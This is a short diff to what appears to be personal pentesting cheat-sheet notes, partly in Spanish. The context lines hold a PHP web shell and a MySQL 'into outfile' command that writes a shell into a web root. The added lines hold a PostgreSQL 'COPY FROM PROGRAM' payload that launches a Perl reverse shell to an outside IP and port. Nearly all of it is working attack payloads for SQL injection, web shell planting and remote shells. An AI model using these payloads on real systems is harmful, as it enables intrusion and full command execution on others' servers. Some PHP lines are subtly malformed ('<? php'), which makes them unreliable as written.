@@ -107,3 +107,7 @@ note: debe ser junto `<?php`
 <? php system ($_REQUEST[0]); ?>
 select '<? php $_GET['cmd'] ?> ' into outfile  "/var/www/chattr-prod/whell.php"
 
+
+```bash
+COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.15.152:333");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
+```
